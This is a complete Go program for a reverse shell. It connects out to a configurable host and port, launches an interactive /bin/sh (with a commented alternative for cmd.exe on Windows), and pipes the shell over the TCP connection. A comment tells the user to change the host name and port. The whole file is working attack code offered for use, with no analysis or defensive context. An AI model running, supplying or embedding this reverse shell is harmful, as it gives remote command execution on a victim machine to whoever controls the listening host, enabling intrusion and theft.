package main 

import (
 "os/exec"
 "net"
 "log"
 "io"
 "strconv"
)

// Change the host name and port
const RHOST = "localhost"
const RPORT = 8001

func handle(conn net.Conn) {
 defer conn.Close()

// for linux
 cmd := exec.Command("/bin/sh","-i")
// for windows
// cmd := exec.Command("cmd.exe")

 rp,wp := io.Pipe()

 cmd.Stdin = conn
 cmd.Stdout = wp

 go io.Copy(conn,rp)

 if err := cmd.Run(); err != nil {
  log.Fatalln(err)
 }
}

func main(){
 address := RHOST + ":" + strconv.Itoa(RPORT)
 conn,err := net.Dial("tcp",address)

 if err != nil {
  log.Fatalln("Error connecting to the host")
 }

 log.Printf("Connected to %s:%d\n",RHOST,RPORT)
 handle(conn)
}





